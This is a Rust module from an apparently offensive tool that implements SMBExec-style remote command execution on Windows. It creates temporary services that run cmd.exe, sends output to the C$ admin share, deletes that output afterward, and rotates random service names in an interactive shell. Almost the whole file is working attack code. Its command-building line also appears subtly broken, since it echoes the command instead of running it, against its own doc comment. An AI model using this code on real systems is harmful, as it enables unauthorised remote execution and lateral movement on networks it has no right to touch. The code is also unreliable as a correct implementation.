//! SMBExec-style remote execution via SCM + cmd.exe.
//!
//! Unlike PSExec, this does NOT deploy a binary.
//! Instead, it creates a service whose binary path is `cmd.exe /C <command>`,
//! redirecting output to a file on the admin share, then reads it back.

use crate::error::{OverthroneError, Result};
use crate::proto::smb::SmbSession;
use tracing::{debug, info, warn};

// Reuse DCE/RPC helpers from psexec
use super::psexec;

// ═══════════════════════════════════════════════════════════
//  Public Types
// ═══════════════════════════════════════════════════════════

/// Configuration for SMBExec
pub struct SmbExecConfig {
    /// Service name prefix
    pub service_name: String,
    /// Share to write output file to (default: "C$")
    pub output_share: String,
    /// Path within share for output file
    pub output_path: String,
    /// Whether to cleanup service and output after execution
    pub cleanup: bool,
}

impl Default for SmbExecConfig {
    fn default() -> Self {
        let id = rand::random::<u16>();
        SmbExecConfig {
            service_name: format!("SmbEx{:04X}", id),
            output_share: "C$".to_string(),
            output_path: format!("Windows\\Temp\\__smbexec_{:04X}.tmp", id),
            cleanup: true,
        }
    }
}

/// Result of an SMBExec command
#[derive(Debug)]
pub struct SmbExecResult {
    pub target: String,
    pub command: String,
    pub success: bool,
    pub output: String,
}

// ═══════════════════════════════════════════════════════════
//  SMBExec Execution
// ═══════════════════════════════════════════════════════════

/// Execute a command on a remote host using SMBExec.
///
/// This creates a temporary Windows service whose binary path is
/// `%COMSPEC% /Q /c <command> > \\127.0.0.1\C$\<output_path> 2>&1`,
/// starts it, reads the output file, then cleans up.
pub async fn exec_command(session: &SmbSession, command: &str) -> Result<SmbExecResult> {
    let config = SmbExecConfig::default();
    execute(session, command, &config).await
}

/// Execute with custom configuration
pub async fn execute(
    session: &SmbSession,
    command: &str,
    config: &SmbExecConfig,
) -> Result<SmbExecResult> {
    info!(
        "SMBExec: Executing on {} via service '{}'",
        session.target, config.service_name
    );
    debug!("SMBExec: Command: {}", command);

    // Build the service binary path that redirects output to a file
    let output_unc = format!(
        "\\\\127.0.0.1\\{}\\{}",
        config.output_share, config.output_path
    );
    let binary_path = format!(
        "%COMSPEC% /Q /c echo {} ^> {} 2^>^&1 > {} 2>&1",
        command, output_unc, output_unc
    );

    // Use PSExec-style SCM interaction to create and start the service
    let psexec_config = psexec::PsExecConfig {
        service_name: config.service_name.clone(),
        display_name: config.service_name.clone(),
        command: binary_path,
        cleanup: false, // We handle cleanup ourselves
    };

    let exec_result = psexec::execute(session, &psexec_config).await;

    // Wait for command to complete
    tokio::time::sleep(std::time::Duration::from_secs(2)).await;

    // Read output file
    let output = read_and_cleanup_output(session, config).await;

    match exec_result {
        Ok(r) => Ok(SmbExecResult {
            target: session.target.clone(),
            command: command.to_string(),
            success: r.success,
            output,
        }),
        Err(e) => {
            // Even if service ops failed, we might still have output
            warn!("SMBExec: Service operation error: {e}");
            Ok(SmbExecResult {
                target: session.target.clone(),
                command: command.to_string(),
                success: false,
                output,
            })
        }
    }
}

/// Read the output file and optionally delete it
async fn read_and_cleanup_output(session: &SmbSession, config: &SmbExecConfig) -> String {
    match session
        .read_file(&config.output_share, &config.output_path)
        .await
    {
        Ok(data) => {
            let output = String::from_utf8_lossy(&data).to_string();
            debug!("SMBExec: Read {} bytes of output", data.len());

            if config.cleanup
                && let Err(e) = session
                    .delete_file(&config.output_share, &config.output_path)
                    .await
                {
                    warn!("SMBExec: Failed to cleanup output file: {e}");
                }

            output
        }
        Err(e) => {
            debug!("SMBExec: No output file found: {e}");
            String::new()
        }
    }
}

/// Execute a series of commands and collect all outputs
pub async fn exec_commands(session: &SmbSession, commands: &[&str]) -> Vec<SmbExecResult> {
    let mut results = Vec::new();

    for cmd in commands {
        match exec_command(session, cmd).await {
            Ok(r) => results.push(r),
            Err(e) => {
                warn!("SMBExec: Failed '{}': {e}", cmd);
                results.push(SmbExecResult {
                    target: session.target.clone(),
                    command: cmd.to_string(),
                    success: false,
                    output: format!("Error: {e}"),
                });
            }
        }
    }

    results
}

/// Interactive-style shell: execute commands one at a time
pub struct SmbExecShell<'a> {
    session: &'a SmbSession,
    config: SmbExecConfig,
    history: Vec<(String, String)>,
}

impl<'a> SmbExecShell<'a> {
    pub fn new(session: &'a SmbSession) -> Self {
        SmbExecShell {
            session,
            config: SmbExecConfig::default(),
            history: Vec::new(),
        }
    }

    /// Execute a command and return its output
    pub async fn exec(&mut self, command: &str) -> Result<String> {
        // Rotate service name for each command
        let id = rand::random::<u16>();
        self.config.service_name = format!("SmbEx{:04X}", id);
        self.config.output_path = format!("Windows\\Temp\\__smbexec_{:04X}.tmp", id);

        let result = execute(self.session, command, &self.config).await?;
        self.history
            .push((command.to_string(), result.output.clone()));
        Ok(result.output)
    }

    /// Get command history
    pub fn history(&self) -> &[(String, String)] {
        &self.history
    }
}

// ═══════════════════════════════════════════════════════════
//  Executor Implementation
// ═══════════════════════════════════════════════════════════

pub struct SmbExecutor {
    creds: super::ExecCredentials,
}

impl SmbExecutor {
    pub fn new(creds: super::ExecCredentials) -> Self {
        Self { creds }
    }
}

#[async_trait::async_trait]
impl super::RemoteExecutor for SmbExecutor {
    fn method(&self) -> super::ExecMethod {
        super::ExecMethod::SmbExec
    }

    async fn execute(
        &self,
        target: &str,
        command: &str,
    ) -> crate::error::Result<super::ExecOutput> {
        info!("SmbExecutor: Executing command on {}", target);

        // Create SMB session
        let session = SmbSession::connect(
            target,
            &self.creds.username,
            &self.creds.password,
            &self.creds.domain,
        )
        .await?;

        // Execute via SMBExec
        let result = exec_command(&session, command).await?;

        Ok(super::ExecOutput {
            stdout: result.output,
            stderr: String::new(),
            exit_code: Some(if result.success { 0 } else { 1 }),
            method: super::ExecMethod::SmbExec,
        })
    }

    async fn check_available(&self, target: &str) -> bool {
        // Check if we can connect to SMB and access admin shares
        match SmbSession::connect(
            target,
            &self.creds.username,
            &self.creds.password,
            &self.creds.domain,
        )
        .await
        {
            Ok(session) => {
                // Try to access C$ or ADMIN$ share
                session.check_share_read("C$").await || session.check_share_read("ADMIN$").await
            }
            Err(_) => false,
        }
    }
}
